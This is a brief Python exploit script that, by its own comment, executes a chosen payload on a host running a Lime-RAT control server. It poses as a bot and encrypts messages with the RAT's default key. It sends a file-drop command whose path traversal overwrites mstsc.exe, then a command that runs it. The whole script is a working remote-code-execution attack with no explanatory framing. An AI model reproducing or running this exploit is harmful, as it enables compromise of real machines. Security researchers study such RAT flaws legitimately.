import base64
import socket
import sys
import hashlib
import socket
import time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

# executes payload on a host running Lime-RAT server

if len(sys.argv) != 4:
    print "Usage: " + sys.argv[0] + " host port payload_filename"
    sys.exit()

host = sys.argv[1]
port = sys.argv[2]
fn = sys.argv[3]

SPL = "|'L'|"
EOF = "|'N'|"
BOT = "root_929583106100"
EncryptionKey = "asdf"

def aes(s):
    key = hashlib.md5(EncryptionKey).digest()
    key = key[:-1] + key + '\x00'
    s = pad(s, 16, 'pkcs7')
    cipher = AES.new(key, AES.MODE_ECB)
    return base64.b64encode(cipher.encrypt(s))

with open(fn, 'rb') as file:
    payload = base64.b64encode(file.read())

p1 = "OFM" + SPL + BOT
p2 = "DW" + SPL + BOT + SPL + payload + SPL + "..\\..\\..\\mstsc.exe"
p3 = "WRDP";

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, int(port)))
s.send(aes(p1) + EOF)
time.sleep(0.5)
s.send(aes(p2) + EOF)
time.sleep(0.5)
s.send(aes(p3) + EOF)
s.close()

